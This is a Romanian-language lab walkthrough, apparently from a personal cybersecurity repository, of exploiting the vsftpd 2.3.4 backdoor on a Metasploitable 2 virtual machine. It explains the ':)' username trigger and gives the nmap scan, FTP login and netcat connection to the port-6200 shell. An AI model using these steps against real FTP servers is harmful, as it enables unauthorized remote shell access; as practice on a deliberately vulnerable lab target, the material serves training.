### Atac FTP:

   - versiune: *vsftpd 2.3.4*
   [In 2011, in arhiva de pe site-ul oficial al serviciului FTP a fost atasat un virus backdoor care executa un shell pe portul 6200. Pentru a executa virusul, username-ul folosit la conectarea serviciului FTP putea fi oricare sir de caractere urmat de un ":)"]

   - Pasii atacului:
      
         nmap -sSV 192.168.56.102 -p21,6200
     ##### Explicatii comanda:
        ```
        nmap <-> tool pentru a scana servicii
        -sSV <-> Stealth scan version
        192.168.56.102 <-> adresa IP a tintei (Metaplsoitable 2)
        -p21,6200 <-> scanam doar porturile 21 si 6200
        ```
     ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-nmap-1.png)

     Se poate observa ca portul 6200 inca nu este deschis.
     
         ftp 192.168.56.102 21
     
     ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-2.png)
     
         nmap 192.168.56.102 -p6200
         
     ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-nmap-2.png)
     
     Se poate vedea dupa o inca scanare a portului 6200 ca acum este deschis.
     
         nc -v 192.168.56.102 6200
         
      ##### Explicatii comanda:
        ```
        nc <-> netcat
        -v <-> verbose
        192.168.56.102 <-> adresa IP a tintei
        6200 <-> portul pe care ne conectam
        ```     
      ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-done.png)
